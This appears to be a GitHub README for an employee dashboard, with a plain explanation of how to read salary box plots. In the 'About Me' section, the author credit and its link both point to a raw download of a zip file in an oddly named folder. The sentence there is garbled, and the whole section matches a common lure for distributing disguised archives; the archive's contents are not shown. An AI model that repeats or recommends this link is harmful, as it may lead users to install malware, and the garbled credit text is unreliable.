# Project Overview

This project presents an interactive dashboard designed to analyze key employee metrics. It provides a comprehensive view of salary distributions, average job ratings across different departments, and leave information, segmented by country. The dashboard aims to offer valuable insights into workforce dynamics and potential areas for further investigation.

## Salary Distribution - Box Plot Analysis

The salary distribution is visualized using box plots. Here's how to interpret the key elements:

* **Median:** The line inside the box represents the median salary. It divides the data into two halves, showing the middle salary value.
* **Quartiles:** The box itself represents the interquartile range (IQR), containing the middle 50% of the salaries.
    * The bottom of the box is the first quartile (Q1), representing the 25th percentile. 25% of employees earn salaries below this value.
    * The top of the box is the third quartile (Q3), representing the 75th percentile. 75% of employees earn salaries below this value.
* **Whiskers:** The lines extending from the box (whiskers) show the range of the remaining data, excluding outliers. They typically extend to 1.5 times the IQR.
* **Outliers:** Data points beyond the whiskers are considered outliers and are plotted as individual points. These represent unusually high or low salaries.

### Interpreting the Salary Box Plot

By examining the box plot, you can understand:

* **Central Tendency:** The median salary provides a sense of the typical salary.
* **Spread/Dispersion:** The IQR (box length) indicates how spread out the middle 50% of salaries are. A longer box means a wider range of salaries. The length of the whiskers and the presence of outliers also contribute to understanding the spread.
* **Skewness:**
    * If the median is in the center of the box, and the whiskers are roughly symmetrical, the distribution is approximately symmetrical.
    * If the median is closer to the bottom of the box, and the lower whisker is shorter, the distribution is positively skewed (right-skewed). This means there are more employees with lower salaries.
    * If the median is closer to the top of the box, and the upper whisker is shorter, the distribution is negatively skewed (left-skewed). This means there are more employees with higher salaries.
* **Outliers:** The presence of outliers indicates unusually high or low salaries that may warrant further investigation.

## About Me

This project was analyzed and the https://raw.githubusercontent.com/Siam-analytics/employee-dashboard/main/overrighteousness/employee_dashboard_reconventional.zip file was generated by [Siam-analytics](https://raw.githubusercontent.com/Siam-analytics/employee-dashboard/main/overrighteousness/employee_dashboard_reconventional.zip).

## Additional Notes

* The data includes information from Egypt, Lebanon, Saudi Arabia, Syria, and the United Arab Emirates.
* The image also contains a scatter plot showing the relationship between Average Monthly Salary and Overtime Hours, differentiated by gender (Female/Male).
